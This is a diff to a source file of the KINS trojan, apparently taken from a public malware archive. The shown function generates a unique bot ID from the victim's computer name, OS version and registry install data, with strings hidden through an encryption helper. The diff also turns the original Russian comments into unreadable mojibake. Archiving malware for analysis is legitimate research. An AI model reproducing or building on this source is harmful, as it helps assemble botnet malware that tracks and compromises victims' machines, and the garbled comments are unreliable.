@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <sddl.h>
 
@@ -105,11 +116,11 @@ void OsEnv::_generateBotId(LPWSTR buf)
   WCHAR cid[40];
   DWORD subId[2];
 
-  //Получаем NetBIOS.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NetBIOS.
   int size = sizeof(cid) / sizeof(WCHAR);
   if(CWA(kernel32, GetComputerNameW)(cid, (LPDWORD)&size) == FALSE) CryptedStrings::_getW(CryptedStrings::id_osenv_botid_unknown, cid);
 
-  //Получаем версию. Здесь мощная параноя по поводу Mem::_zero().
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Mem::_zero().
   OSVERSIONINFOEXW ovi;
   Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
   ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
@@ -119,20 +130,20 @@ void OsEnv::_generateBotId(LPWSTR buf)
   {
     CSTR_GETW(regKey, osenv_botid_regkey);
 
-    //Дата установки.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       CSTR_GETW(regValue1, osenv_botid_regvalue_1);
       subId[0] = Registry::_getValueAsDword(HKEY_LOCAL_MACHINE, regKey, regValue1);
     }
 
-    //Данные о регистрации.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       CSTR_GETW(regValue2, osenv_botid_regvalue_2);
       subId[1] = Registry::_getsCrc32OfValue(HKEY_LOCAL_MACHINE, regKey, regValue2);
     }
   }
 
-  //Создаем полный ID
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ID
   {
     CSTR_GETW(format, osenv_botid_format);
     size = Str::_sprintfW(buf, 60, format, cid, Crypt::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Crypt::crc32Hash((LPBYTE)subId, sizeof(subId)));
